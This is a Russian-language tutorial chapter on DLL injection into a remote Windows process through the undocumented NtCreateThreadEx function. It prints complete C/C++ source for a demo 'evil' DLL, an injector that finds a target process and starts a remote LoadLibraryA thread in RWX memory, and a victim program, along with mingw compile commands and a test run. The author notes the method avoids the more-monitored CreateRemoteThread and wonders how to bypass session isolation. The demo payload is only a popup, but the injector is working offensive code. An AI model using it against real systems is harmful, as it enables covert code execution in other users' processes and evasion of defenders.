\newpage
\subsection{21. DLL-инъекция через недокументированную функцию NtCreateThreadEx. Простой пример на C++.}

الرَّحِيمِ الرَّحْمَٰنِ للَّهِ بِسْمِ 

![dll injection](./images/29/2021-12-07_00-41.png){width="80%"}    

В предыдущих разделах я писал о классической DLL-инъекции [через CreateRemoteThread](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html), [через SetWindowsHookEx](https://cocomelonc.github.io/tutorial/2021/11/25/malware-injection-7.html).    

Сегодня я рассмотрю другую технику DLL-инъекции. Её суть заключается в использовании недокументированной функции `NtCreateThreadEx`. Давайте разберем, как можно внедрить вредоносную DLL в удаленный процесс, используя функции Win32API: `VirtualAllocEx`, `WriteProcessMemory`, `WaitForSingleObject`, а также официально недокументированный Native API `NtCreateThreadEx`.    

Прежде всего, рассмотрим пример исходного кода вредоносной DLL (`evil.c`):    

```cpp
/*
DLL example for DLL injection via NtCreateThreadEx
author: @cocomelonc
https://cocomelonc.github.io/pentest/2021/12/06/malware-injection-9.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call)  {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow-meow!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Как обычно, всё довольно просто. Просто выводим всплывающее окно "Meow-meow!". 

Компилируем нашу DLL:    

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

![dll injection 2](./images/29/2021-12-07_09-48.png){width="80%"}    

Теперь давайте рассмотрим исходный код нашего вредоносного кода (`hack.cpp`):


```cpp
/*
hack.cpp
DLL injection via undocumented NtCreateThreadEx example
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/06/malware-injection-9.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

#pragma comment(lib, "advapi32.lib") 

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
  OUT PHANDLE hThread,
  IN ACCESS_MASK DesiredAccess,
  IN PVOID ObjectAttributes,
  IN HANDLE ProcessHandle,
  IN PVOID lpStartAddress,
  IN PVOID lpParameter,
  IN ULONG Flags,
  IN SIZE_T StackZeroBits,
  IN SIZE_T SizeOfStackCommit,
  IN SIZE_T SizeOfStackReserve,
  OUT PVOID lpBytesBuffer
);

// get process PID
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  DWORD pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE ht; // thread handle
  LPVOID rb; // remote buffer
  SIZE_T rl; // return length

  char evilDll[] = "evil.dll";
  int evilLen = sizeof(evilDll) + 1;
  
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  LPTHREAD_START_ROUTINE lb = 
  (LPTHREAD_START_ROUTINE) GetProcAddress(
    hKernel32, "LoadLibraryA");
  pNtCreateThreadEx ntCTEx = (pNtCreateThreadEx)GetProcAddress(
    GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
  
  if (ntCTEx == NULL) {
    CloseHandle(ph);
    printf("NtCreateThreadEx failed :( exiting...\n");
    return -2;
  }

  pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

    if (ph == NULL) {
      printf("OpenProcess failed :( exiting...\n");
      return -2;
    }

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, evilLen, 
    MEM_RESERVE | MEM_COMMIT, 
    PAGE_EXECUTE_READWRITE);

    // write payload to memory buffer
    WriteProcessMemory(ph, rb, evilDll, evilLen, rl); // NULL);

    ntCTEx(&ht, 0x1FFFFF, NULL, ph, 
    (LPTHREAD_START_ROUTINE) lb, rb, 
    FALSE, NULL, NULL, NULL, NULL);

    if (ht == NULL) {
      CloseHandle(ph);
      printf("ThreadHandle failed :( exiting...\n");
      return -2;
    } else {
      printf("successfully inject via NtCreateThreadEx :)\n");
    }
    
    WaitForSingleObject(ht, INFINITE);

    CloseHandle(ht);
    CloseHandle(ph);
  }
  return 0;
}

```

Давайте разберем логику этого кода. Как видно, сначала я использую функцию `FindMyProc` из одного из моих [прошлых](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html) постов. Она довольно проста: принимает имя процесса, в который мы хотим выполнить инъекцию, пытается найти его в памяти операционной системы, и если процесс существует и запущен, функция возвращает его ID.   

Затем, в функции `main` логика такая же, как в моем посте про [классическую DLL-инъекцию](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html). Единственное отличие - мы используем функцию `NtCreateThreadEx` вместо `CreateRemoteThread`:    

![dll injection 3](./images/29/2021-12-07_11-20.png){width="80%"}    

Как показано в этом коде, вызовы Windows API можно заменить на функции Native API. Например, `VirtualAllocEx` можно заменить на `NtAllocateVirtualMemory`, а `WriteProcessMemory` на `NtWriteProcessMemory`.    

Недостатком этого метода является то, что функция `NtCreateThreadEx` недокументирована, поэтому в будущем она может измениться.    

Однако есть нюанс. Давайте создадим простой код для нашего *"жертвы"* процесса (`mouse.c`):    

```cpp
/*
hack.cpp
victim process source code for DLL injection via NtCreateThreadEx
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/06/malware-injection-9.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int main() {
  MessageBox(NULL, "Squeak-squeak!", "<:( )~~", MB_OK);
  return 0;
}

```

Как видно, логика проста: просто всплывающее сообщение `Squeak-squeak!`. Компилируем: 

```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-fpermissive
```

![dll injection 4](./images/29/2021-12-07_11-45.png){width="80%"}    

И проверяем:

![dll injection 5](./images/29/2021-12-07_12-21.png){width="80%"}    

Всё работает идеально.  

Теперь внедрим нашу вредоносную DLL в этот процесс. Компилируем `hack.cpp`:
```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive
```

![dll inject 6](./images/29/2021-12-07_12-24.png){width="80%"}    

Запускаем Process Hacker 2:   

![dll inject 7](./images/29/2021-12-07_12-27.png){width="80%"}    

Как видно, выделенный процесс - это наша "жертва" `mouse.exe`.    

Запускаем наше вредоносное ПО:   

```powershell
.\hack.exe mouse.exe
```

![dll inject 8](./images/29/2021-12-07_12-31.png){width="80%"}    

Наше ПО успешно нашло ID процесса жертвы.    

Теперь исследуем свойства процесса жертвы `PID: 3884`:   

![dll inject 9](./images/29/2021-12-07_12-34.png){width="80%"}    

![dll inject 10](./images/29/2021-12-07_12-37.png){width="80%"}    

Как видно, наша вредоносная DLL успешно внедрена, как и ожидалось!   

Но почему мы не можем внедрить её в другой процесс, например, `notepad.exe` или `svchost.exe`?   

Я прочитал про [разделение сессий](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) и думаю, что это причина проблемы. У меня есть вопрос: как можно обойти это ограничение в Windows 10? :)    

Преимущество этой техники в том, что мы не используем `CreateRemoteThread`, который более популярен и подозрителен, а значит, чаще проверяется синими командами.    

Я надеюсь, что этот пост повысит осведомленность синих команд об этой интересной технике и добавит ещё одно оружие в арсенал красных команд.   

[Session Separation](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361)    
[исходный код на Github](https://github.com/cocomelonc/2021-12-06-malware-injection-9)    
